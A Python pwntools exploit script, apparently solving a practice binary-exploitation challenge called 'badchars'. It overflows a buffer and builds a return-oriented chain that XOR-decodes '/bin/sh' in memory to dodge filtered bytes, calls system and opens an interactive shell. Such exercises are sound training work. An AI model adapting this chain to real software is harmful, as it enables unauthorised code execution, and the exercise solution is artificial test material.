from pwn import *
p = process("./badchars")

i = 0
while i < 4:
    print(p.recvline())
    i = i + 1

offset = '\x41' * 40

shstring = "+ajm+ph\x00"
key1 = p64(0x4)
key2 = p64(0x3)

pop_r14_r15 = p64(0x400b40)
xorfunc = p64(0x400b30)
movstring_to_mem = p64(0x400b34)

bss = p64(0x601080)
bss2 = p64(0x601081)
bss3 = p64(0x601082)
bss4 = p64(0x601083)
bss5 = p64(0x601084)
bss6 = p64(0x601085)

pop_12_13 = p64(0x400b3b)
pop_rdi = p64(0x400b39)
system = p64(0x4009e8)

rop = offset + pop_12_13 + shstring + bss + movstring_to_mem + pop_r14_r15 + key1 + bss + xorfunc + pop_r14_r15 + key2 + bss2 + xorfunc + pop_r14_r15 + key2 + bss3 + xorfunc + pop_r14_r15 + key2 + bss4 + xorfunc+ pop_r14_r15 + key1 + bss5 + xorfunc + pop_r14_r15 + key2 + bss6 + xorfunc + pop_rdi + bss + system

p.sendline(rop)
p.interactive()
